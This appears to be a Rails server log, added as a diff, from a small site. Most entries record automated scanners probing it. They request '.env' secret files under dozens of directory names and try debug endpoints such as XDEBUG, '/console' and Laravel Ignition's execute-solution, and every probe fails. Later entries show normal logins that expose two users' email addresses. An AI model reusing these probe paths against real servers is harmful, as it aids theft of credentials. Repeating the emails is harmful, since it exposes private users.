+Started GET "/?XDEBUG_SESSION_START=phpstorm" for 45.146.165.37 at 2022-01-05 19:03:18 +0000
+Cannot render console from 45.146.165.37! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by WelcomeController#home as HTML
+  Parameters: {"XDEBUG_SESSION_START"=>"phpstorm"}
+  Rendering layout layouts/application.html.erb
+  Rendering welcome/home.html.erb within layouts/application
+  Rendered welcome/home.html.erb within layouts/application (Duration: 0.1ms | Allocations: 43)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 4.8ms | Allocations: 3093)
+Completed 200 OK in 6ms (Views: 5.4ms | Allocations: 3470)
+
+
+Started GET "/console/" for 45.146.165.37 at 2022-01-05 19:17:52 +0000
+Cannot render console from 45.146.165.37! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/console"):
+  
+Started GET "/" for 213.81.209.68 at 2022-01-05 19:33:45 +0000
+Cannot render console from 213.81.209.68! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by WelcomeController#home as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering welcome/home.html.erb within layouts/application
+  Rendered welcome/home.html.erb within layouts/application (Duration: 0.1ms | Allocations: 43)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 6.9ms | Allocations: 3109)
+Completed 200 OK in 8ms (Views: 7.3ms | Allocations: 3488)
+
+
+Started GET "/" for 136.144.41.117 at 2022-01-05 19:43:15 +0000
+Cannot render console from 136.144.41.117! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by WelcomeController#home as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering welcome/home.html.erb within layouts/application
+  Rendered welcome/home.html.erb within layouts/application (Duration: 0.1ms | Allocations: 43)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 5.5ms | Allocations: 3093)
+Completed 200 OK in 7ms (Views: 5.9ms | Allocations: 3470)
+
+
+Started GET "/_ignition/execute-solution" for 45.146.165.37 at 2022-01-05 20:25:10 +0000
+Cannot render console from 45.146.165.37! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/_ignition/execute-solution"):
+  
+Started GET "/.env" for 159.223.161.254 at 2022-01-05 20:29:58 +0000
+Cannot render console from 159.223.161.254! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/.env"):
+  
+Started POST "/" for 159.223.161.254 at 2022-01-05 20:29:59 +0000
+Cannot render console from 159.223.161.254! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [POST] "/"):
+  
+Started GET "/" for 198.98.49.124 at 2022-01-05 20:31:39 +0000
+Cannot render console from 198.98.49.124! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by WelcomeController#home as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering welcome/home.html.erb within layouts/application
+  Rendered welcome/home.html.erb within layouts/application (Duration: 0.1ms | Allocations: 43)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 4.7ms | Allocations: 3109)
+Completed 200 OK in 6ms (Views: 5.1ms | Allocations: 3487)
+
+
+Started GET "/" for 45.137.23.232 at 2022-01-05 20:32:58 +0000
+Cannot render console from 45.137.23.232! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by WelcomeController#home as */*
+  Rendering layout layouts/application.html.erb
+  Rendering welcome/home.html.erb within layouts/application
+  Rendered welcome/home.html.erb within layouts/application (Duration: 0.1ms | Allocations: 43)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 5.6ms | Allocations: 3093)
+Completed 200 OK in 7ms (Views: 6.7ms | Allocations: 3479)
+
+
+Started GET "/.env" for 185.254.196.217 at 2022-01-05 20:53:57 +0000
+Cannot render console from 185.254.196.217! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/.env"):
+  
+Started POST "/" for 185.254.196.217 at 2022-01-05 20:53:58 +0000
+Cannot render console from 185.254.196.217! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [POST] "/"):
+  
+Started GET "/" for 209.17.96.170 at 2022-01-05 21:02:34 +0000
+Cannot render console from 209.17.96.170! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by WelcomeController#home as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering welcome/home.html.erb within layouts/application
+  Rendered welcome/home.html.erb within layouts/application (Duration: 0.1ms | Allocations: 43)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 5.7ms | Allocations: 3109)
+Completed 200 OK in 7ms (Views: 6.1ms | Allocations: 3487)
+
+
+Started POST "/" for 135.125.217.54 at 2022-01-05 21:09:05 +0000
+Cannot render console from 135.125.217.54! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [POST] "/"):
+  
+Started GET "/.env" for 135.125.217.54 at 2022-01-05 21:09:06 +0000
+Cannot render console from 135.125.217.54! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/.env"):
+  
+Started POST "/" for 135.125.217.54 at 2022-01-05 23:07:31 +0000
+Cannot render console from 135.125.217.54! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [POST] "/"):
+  
+Started GET "/.env" for 135.125.217.54 at 2022-01-05 23:07:33 +0000
+Cannot render console from 135.125.217.54! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/.env"):
+  
+Started GET "/" for 174.143.96.180 at 2022-01-05 23:32:19 +0000
+Cannot render console from 174.143.96.180! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by WelcomeController#home as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering welcome/home.html.erb within layouts/application
+  Rendered welcome/home.html.erb within layouts/application (Duration: 0.1ms | Allocations: 43)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 4.5ms | Allocations: 3109)
+Completed 200 OK in 6ms (Views: 5.3ms | Allocations: 3487)
+
+
+Started GET "/vod_installer/.env" for 54.242.40.12 at 2022-01-05 23:46:17 +0000
+Cannot render console from 54.242.40.12! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/vod_installer/.env"):
+  
+Started GET "/login/.env" for 54.242.40.12 at 2022-01-05 23:46:18 +0000
+Cannot render console from 54.242.40.12! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/login/.env"):
+  
+Started GET "/apps/.env" for 54.242.40.12 at 2022-01-05 23:46:18 +0000
+Cannot render console from 54.242.40.12! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/apps/.env"):
+  
+Started GET "/docker/.env" for 54.242.40.12 at 2022-01-05 23:46:19 +0000
+Cannot render console from 54.242.40.12! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/docker/.env"):
+  
+Started GET "/engine/.env" for 54.242.40.12 at 2022-01-05 23:46:20 +0000
+Cannot render console from 54.242.40.12! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/engine/.env"):
+  
+Started GET "/vue/.env" for 54.242.40.12 at 2022-01-05 23:46:20 +0000
+Cannot render console from 54.242.40.12! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/vue/.env"):
+  
+Started GET "/development/.env" for 54.242.40.12 at 2022-01-05 23:46:21 +0000
+Cannot render console from 54.242.40.12! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/development/.env"):
+  
+Started GET "/system/.env" for 54.242.40.12 at 2022-01-05 23:46:22 +0000
+Cannot render console from 54.242.40.12! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/system/.env"):
+  
+Started GET "/admin/.env" for 54.242.40.12 at 2022-01-05 23:46:22 +0000
+Cannot render console from 54.242.40.12! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/admin/.env"):
+  
+Started GET "/deployment/.env" for 54.242.40.12 at 2022-01-05 23:46:23 +0000
+Cannot render console from 54.242.40.12! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/deployment/.env"):
+  
+Started GET "/app/.env" for 54.242.40.12 at 2022-01-05 23:46:24 +0000
+Cannot render console from 54.242.40.12! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/app/.env"):
+  
+Started GET "/backend/.env" for 54.242.40.12 at 2022-01-05 23:46:24 +0000
+Cannot render console from 54.242.40.12! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/backend/.env"):
+  
+Started GET "/dependencies/.env" for 54.242.40.12 at 2022-01-05 23:46:25 +0000
+Cannot render console from 54.242.40.12! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/dependencies/.env"):
+  
+Started GET "/laravel/.env" for 54.242.40.12 at 2022-01-05 23:46:26 +0000
+Cannot render console from 54.242.40.12! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/laravel/.env"):
+  
+Started GET "/auth/.env" for 54.242.40.12 at 2022-01-05 23:46:26 +0000
+Cannot render console from 54.242.40.12! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/auth/.env"):
+  
+Started GET "/personal/.env" for 54.242.40.12 at 2022-01-05 23:46:27 +0000
+Cannot render console from 54.242.40.12! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/personal/.env"):
+  
+Started GET "/framework/.env" for 54.242.40.12 at 2022-01-05 23:46:28 +0000
+Cannot render console from 54.242.40.12! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/framework/.env"):
+  
+Started GET "/cp/.env" for 54.242.40.12 at 2022-01-05 23:46:28 +0000
+Cannot render console from 54.242.40.12! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/cp/.env"):
+  
+Started GET "/shared/.env" for 54.242.40.12 at 2022-01-05 23:46:29 +0000
+Cannot render console from 54.242.40.12! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/shared/.env"):
+  
+Started GET "/server/.env" for 54.242.40.12 at 2022-01-05 23:46:30 +0000
+Cannot render console from 54.242.40.12! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/server/.env"):
+  
+Started GET "/local/.env" for 54.242.40.12 at 2022-01-05 23:46:30 +0000
+Cannot render console from 54.242.40.12! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/local/.env"):
+  
+Started GET "/private/.env" for 54.242.40.12 at 2022-01-05 23:46:31 +0000
+Cannot render console from 54.242.40.12! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/private/.env"):
+  
+Started GET "/web/.env" for 54.242.40.12 at 2022-01-05 23:46:32 +0000
+Cannot render console from 54.242.40.12! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/web/.env"):
+  
+Started GET "/search/.env" for 54.242.40.12 at 2022-01-05 23:46:32 +0000
+Cannot render console from 54.242.40.12! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/search/.env"):
+  
+Started GET "/document/.env" for 54.242.40.12 at 2022-01-05 23:46:33 +0000
+Cannot render console from 54.242.40.12! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/document/.env"):
+  
+Started GET "/src/.env" for 54.242.40.12 at 2022-01-05 23:46:34 +0000
+Cannot render console from 54.242.40.12! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/src/.env"):
+  
+Started GET "/master/.env" for 54.242.40.12 at 2022-01-05 23:46:34 +0000
+Cannot render console from 54.242.40.12! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/master/.env"):
+  
+Started GET "/application/.env" for 54.242.40.12 at 2022-01-05 23:46:35 +0000
+Cannot render console from 54.242.40.12! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/application/.env"):
+  
+Started GET "/frontend/.env" for 54.242.40.12 at 2022-01-05 23:46:35 +0000
+Cannot render console from 54.242.40.12! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/frontend/.env"):
+  
+Started GET "/project/.env" for 54.242.40.12 at 2022-01-05 23:46:36 +0000
+Cannot render console from 54.242.40.12! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/project/.env"):
+  
+Started GET "/rest/.env" for 54.242.40.12 at 2022-01-05 23:46:37 +0000
+Cannot render console from 54.242.40.12! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/rest/.env"):
+  
+Started GET "/protected/.env" for 54.242.40.12 at 2022-01-05 23:46:38 +0000
+Cannot render console from 54.242.40.12! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/protected/.env"):
+  
+Started GET "/dev/.env" for 54.242.40.12 at 2022-01-05 23:46:38 +0000
+Cannot render console from 54.242.40.12! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/dev/.env"):
+  
+Started GET "/site/.env" for 54.242.40.12 at 2022-01-05 23:46:39 +0000
+Cannot render console from 54.242.40.12! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/site/.env"):
+  
+Started GET "/back/.env" for 54.242.40.12 at 2022-01-05 23:46:40 +0000
+Cannot render console from 54.242.40.12! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/back/.env"):
+  
+Started GET "/api/.env" for 54.242.40.12 at 2022-01-05 23:46:41 +0000
+Cannot render console from 54.242.40.12! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/api/.env"):
+  
+Started GET "/laravel-artisa/.env" for 54.242.40.12 at 2022-01-05 23:46:42 +0000
+Cannot render console from 54.242.40.12! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/laravel-artisa/.env"):
+  
+Started GET "/config/.env" for 54.242.40.12 at 2022-01-05 23:46:44 +0000
+Cannot render console from 54.242.40.12! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/config/.env"):
+  
+Started GET "/cli/.env" for 54.242.40.12 at 2022-01-05 23:46:44 +0000
+Cannot render console from 54.242.40.12! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/cli/.env"):
+  
+Started GET "/core/.env" for 54.242.40.12 at 2022-01-05 23:46:45 +0000
+Cannot render console from 54.242.40.12! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/core/.env"):
+  
+Started GET "/.env" for 159.223.130.156 at 2022-01-05 23:53:04 +0000
+Cannot render console from 159.223.130.156! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/.env"):
+  
+Started POST "/" for 159.223.130.156 at 2022-01-05 23:53:05 +0000
+Cannot render console from 159.223.130.156! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [POST] "/"):
+  
+Started GET "/.env" for 185.254.196.218 at 2022-01-05 23:56:27 +0000
+Cannot render console from 185.254.196.218! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/.env"):
+  
+Started POST "/" for 185.254.196.218 at 2022-01-05 23:56:28 +0000
+Cannot render console from 185.254.196.218! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [POST] "/"):
+  
+Started GET "/config/getuser?index=0" for 209.141.53.74 at 2022-01-06 00:28:56 +0000
+Cannot render console from 209.141.53.74! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/config/getuser"):
+  
+Started GET "/" for 45.154.255.147 at 2022-01-06 00:35:53 +0000
+Cannot render console from 45.154.255.147! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by WelcomeController#home as */*
+  Rendering layout layouts/application.html.erb
+  Rendering welcome/home.html.erb within layouts/application
+  Rendered welcome/home.html.erb within layouts/application (Duration: 0.1ms | Allocations: 43)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 4.8ms | Allocations: 3109)
+Completed 200 OK in 6ms (Views: 5.2ms | Allocations: 3496)
+
+
+Started GET "/.env" for 44.234.88.174 at 2022-01-06 00:49:15 +0000
+Cannot render console from 44.234.88.174! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/.env"):
+  
+Started POST "/" for 44.234.88.174 at 2022-01-06 00:49:16 +0000
+Cannot render console from 44.234.88.174! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [POST] "/"):
+  
+Started POST "/" for 135.125.217.54 at 2022-01-06 01:08:00 +0000
+Cannot render console from 135.125.217.54! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [POST] "/"):
+  
+Started GET "/.env" for 135.125.217.54 at 2022-01-06 01:08:01 +0000
+Cannot render console from 135.125.217.54! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/.env"):
+  
+Started GET "/.env" for 104.224.29.59 at 2022-01-06 01:46:11 +0000
+Cannot render console from 104.224.29.59! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/.env"):
+  
+Started POST "/" for 104.224.29.59 at 2022-01-06 01:46:12 +0000
+Cannot render console from 104.224.29.59! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [POST] "/"):
+  
+Started GET "/.env" for 159.223.152.187 at 2022-01-06 02:17:16 +0000
+Cannot render console from 159.223.152.187! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/.env"):
+  
+Started POST "/" for 159.223.152.187 at 2022-01-06 02:17:17 +0000
+Cannot render console from 159.223.152.187! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [POST] "/"):
+  
+Started GET "/.env" for 159.223.161.253 at 2022-01-06 02:25:18 +0000
+Cannot render console from 159.223.161.253! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/.env"):
+  
+Started POST "/" for 159.223.161.253 at 2022-01-06 02:25:19 +0000
+Cannot render console from 159.223.161.253! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [POST] "/"):
+  
+Started GET "/" for 152.57.177.78 at 2022-01-06 02:32:36 +0000
+Cannot render console from 152.57.177.78! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by WelcomeController#home as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering welcome/home.html.erb within layouts/application
+  Rendered welcome/home.html.erb within layouts/application (Duration: 0.1ms | Allocations: 43)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 5.2ms | Allocations: 3109)
+Completed 200 OK in 6ms (Views: 5.6ms | Allocations: 3487)
+
+
+Started GET "/shlok/rshlok" for 152.57.177.78 at 2022-01-06 02:33:09 +0000
+Cannot render console from 152.57.177.78! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#rshlok as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering shlok/rshlok.html.erb within layouts/application
+  [1m[36mShlok Load (1.4ms)[0m  [1m[34mSELECT "shloks".* FROM "shloks"[0m
+  ↳ app/views/shlok/rshlok.html.erb:2
+  Rendered shlok/rshlok.html.erb within layouts/application (Duration: 35.9ms | Allocations: 7864)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 41.8ms | Allocations: 11119)
+Completed 200 OK in 45ms (Views: 43.6ms | ActiveRecord: 21.8ms | Allocations: 12620)
+
+
+Started GET "/logging/login" for 152.57.177.78 at 2022-01-06 02:33:28 +0000
+Cannot render console from 152.57.177.78! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by LoggingController#login as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering logging/login.html.erb within layouts/application
+  Rendered logging/login.html.erb within layouts/application (Duration: 1.7ms | Allocations: 782)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 8.0ms | Allocations: 4023)
+Completed 200 OK in 11ms (Views: 9.8ms | ActiveRecord: 0.0ms | Allocations: 5215)
+
+
+Started POST "/logging/loginp" for 152.57.177.78 at 2022-01-06 02:33:42 +0000
+Cannot render console from 152.57.177.78! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by LoggingController#loginp as HTML
+  Parameters: {"authenticity_token"=>"[FILTERED]", "email"=>"mohak_k@ph.iitr.ac.in", "password"=>"[FILTERED]", "commit"=>"Log In"}
+  [1m[36mMember Load (0.9ms)[0m  [1m[34mSELECT "members".* FROM "members" WHERE "members"."email" = $1 LIMIT $2[0m  [["email", "mohak_k@ph.iitr.ac.in"], ["LIMIT", 1]]
+  ↳ app/controllers/logging_controller.rb:5:in `loginp'
+Redirected to http://13.127.46.121/shlok/ashlokr
+Completed 302 Found in 23ms (ActiveRecord: 6.8ms | Allocations: 6764)
+
+
+Started GET "/shlok/ashlokr" for 152.57.177.78 at 2022-01-06 02:33:42 +0000
+Cannot render console from 152.57.177.78! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#ashlokr as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering shlok/ashlokr.html.erb within layouts/application
+  [1m[36mShlok Load (0.9ms)[0m  [1m[34mSELECT "shloks".* FROM "shloks"[0m
+  ↳ app/views/shlok/ashlokr.html.erb:13
+  Rendered shlok/ashlokr.html.erb within layouts/application (Duration: 4.0ms | Allocations: 1444)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 9.9ms | Allocations: 4598)
+Completed 200 OK in 12ms (Views: 10.1ms | ActiveRecord: 0.9ms | Allocations: 5246)
+
+
+Started GET "/shlok/5" for 152.57.166.151 at 2022-01-06 02:35:11 +0000
+Cannot render console from 152.57.166.151! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#ashloku as HTML
+  Parameters: {"id"=>"5"}
+  [1m[36mShlok Load (0.8ms)[0m  [1m[34mSELECT "shloks".* FROM "shloks" WHERE "shloks"."sid" = $1 LIMIT $2[0m  [["sid", 5], ["LIMIT", 1]]
+  ↳ app/controllers/shlok_controller.rb:34:in `ashloku'
+  Rendering layout layouts/application.html.erb
+  Rendering shlok/ashloku.html.erb within layouts/application
+  Rendered shlok/ashloku.html.erb within layouts/application (Duration: 1.7ms | Allocations: 721)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 7.8ms | Allocations: 3754)
+Completed 200 OK in 13ms (Views: 8.7ms | ActiveRecord: 0.8ms | Allocations: 5130)
+
+
+Started GET "/shlok/ashlokr" for 152.57.166.151 at 2022-01-06 02:35:58 +0000
+Cannot render console from 152.57.166.151! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#ashlokr as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering shlok/ashlokr.html.erb within layouts/application
+  [1m[36mShlok Load (0.9ms)[0m  [1m[34mSELECT "shloks".* FROM "shloks"[0m
+  ↳ app/views/shlok/ashlokr.html.erb:13
+  Rendered shlok/ashlokr.html.erb within layouts/application (Duration: 4.0ms | Allocations: 1023)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 9.3ms | Allocations: 4067)
+Completed 200 OK in 10ms (Views: 8.9ms | ActiveRecord: 0.9ms | Allocations: 4485)
+
+
+Started GET "/logging/logout" for 152.57.166.151 at 2022-01-06 02:37:05 +0000
+Cannot render console from 152.57.166.151! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by LoggingController#logout as HTML
+Redirected to http://13.127.46.121/
+Completed 302 Found in 1ms (ActiveRecord: 0.0ms | Allocations: 289)
+
+
+Started GET "/" for 152.57.166.151 at 2022-01-06 02:37:05 +0000
+Cannot render console from 152.57.166.151! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by WelcomeController#home as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering welcome/home.html.erb within layouts/application
+  Rendered welcome/home.html.erb within layouts/application (Duration: 0.1ms | Allocations: 45)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 6.0ms | Allocations: 3105)
+Completed 200 OK in 8ms (Views: 6.6ms | ActiveRecord: 0.0ms | Allocations: 3546)
+
+
+Started GET "/.env" for 185.254.196.218 at 2022-01-06 02:43:40 +0000
+Cannot render console from 185.254.196.218! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/.env"):
+  
+Started POST "/" for 185.254.196.218 at 2022-01-06 02:43:40 +0000
+Cannot render console from 185.254.196.218! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [POST] "/"):
+  
+Started GET "/" for 157.35.63.159 at 2022-01-06 02:46:18 +0000
+Cannot render console from 157.35.63.159! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by WelcomeController#home as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering welcome/home.html.erb within layouts/application
+  Rendered welcome/home.html.erb within layouts/application (Duration: 0.1ms | Allocations: 43)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 4.9ms | Allocations: 3111)
+Completed 200 OK in 6ms (Views: 5.4ms | Allocations: 3492)
+
+
+Started GET "/" for 49.44.87.136 at 2022-01-06 02:46:21 +0000
+Cannot render console from 49.44.87.136! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by WelcomeController#home as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering welcome/home.html.erb within layouts/application
+  Rendered welcome/home.html.erb within layouts/application (Duration: 0.1ms | Allocations: 43)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 4.8ms | Allocations: 3093)
+Completed 200 OK in 6ms (Views: 5.5ms | Allocations: 3470)
+
+
+Started GET "/logging/login" for 157.35.63.159 at 2022-01-06 02:46:27 +0000
+Cannot render console from 157.35.63.159! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by LoggingController#login as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering logging/login.html.erb within layouts/application
+  Rendered logging/login.html.erb within layouts/application (Duration: 0.7ms | Allocations: 300)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 6.0ms | Allocations: 3331)
+Completed 200 OK in 7ms (Views: 6.5ms | Allocations: 3749)
+
+
+Started POST "/logging/loginp" for 157.35.63.159 at 2022-01-06 02:46:42 +0000
+Cannot render console from 157.35.63.159! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by LoggingController#loginp as HTML
+  Parameters: {"authenticity_token"=>"[FILTERED]", "email"=>"shubham_s@ph.iitr.ac.in", "password"=>"[FILTERED]", "commit"=>"Log In"}
+  [1m[36mMember Load (0.9ms)[0m  [1m[34mSELECT "members".* FROM "members" WHERE "members"."email" = $1 LIMIT $2[0m  [["email", "shubham_s@ph.iitr.ac.in"], ["LIMIT", 1]]
+  ↳ app/controllers/logging_controller.rb:5:in `loginp'
+Redirected to http://13.127.46.121/logging/login
+Completed 302 Found in 19ms (ActiveRecord: 10.8ms | Allocations: 4118)
+
+
+Started GET "/logging/login" for 157.35.63.159 at 2022-01-06 02:46:42 +0000
+Cannot render console from 157.35.63.159! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by LoggingController#login as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering logging/login.html.erb within layouts/application
+  Rendered logging/login.html.erb within layouts/application (Duration: 0.6ms | Allocations: 301)
+[Webpacker] Everything's up-to-date. Nothing to do
